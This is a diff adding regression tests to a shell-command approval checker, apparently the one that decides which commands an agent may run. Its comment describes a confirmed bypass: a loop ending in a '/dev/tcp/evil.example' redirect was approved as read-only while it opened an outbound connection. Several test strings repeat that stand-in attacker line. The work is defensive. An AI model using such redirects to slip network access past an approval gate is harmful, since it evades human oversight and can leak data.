@@ -410,3 +410,38 @@ describe('#1057 phase 3 commit 2: a peel residue of only input-redirect clauses 
     expect(covered('while read l; do grep x $l; done < list.txt')).toBe('read-only:grep');
   });
 });
+
+/**
+ * #1062 C6 (CONFIRMED bypass): bash special-cases `/dev/tcp/host/port` and
+ * `/dev/udp/host/port` as virtual network-socket paths -- `< /dev/tcp/...`
+ * opens a live TCP connection instead of reading a file. Every character in
+ * that target is inside `INPUT_REDIRECT_PATH_RE`'s allowed set, so it looked
+ * exactly as "provably a plain file path" as `/dev/null` or `data.txt` to
+ * `isPlainInputRedirectResidue`, and a loop terminator's trailing redirect
+ * was waved through as inert structural residue instead of being judged as
+ * the network read it actually is: `while read l; do cat $l; done <
+ * /dev/tcp/evil.example/443` approved via `read-only:cat`, opening an
+ * outbound connection the covered `cat` body never hinted at.
+ */
+describe('#1062 C6: /dev/tcp and /dev/udp input-redirect residue is refused', () => {
+  test('a bare /dev/tcp residue is no longer structural', () => {
+    expect(stripShellGrammar('done < /dev/tcp/evil.example/443').structural).toBe(false);
+    expect(stripShellGrammar('done < /dev/udp/evil.example/53').structural).toBe(false);
+  });
+
+  test('end to end: the while-loop idiom no longer approves', () => {
+    expect(covered('while read l; do cat $l; done < /dev/tcp/evil.example/443')).toBeNull();
+    expect(covered('while read l; do cat $l; done < /dev/udp/evil.example/53')).toBeNull();
+  });
+
+  test('end to end: a for-loop terminator carries the same residue check', () => {
+    expect(covered('for f in a b; do cat $f; done < /dev/tcp/evil.example/80')).toBeNull();
+  });
+
+  test('positive controls: /dev/null and an ordinary file are unaffected', () => {
+    expect(stripShellGrammar('done < /dev/null')).toEqual({ command: '', structural: true });
+    expect(stripShellGrammar('done < data.txt')).toEqual({ command: '', structural: true });
+    expect(covered('while read l; do cat $l; done < /dev/null')).toBe('read-only:cat');
+    expect(covered('while read l; do cat $l; done < data.txt')).toBe('read-only:cat');
+  });
+});
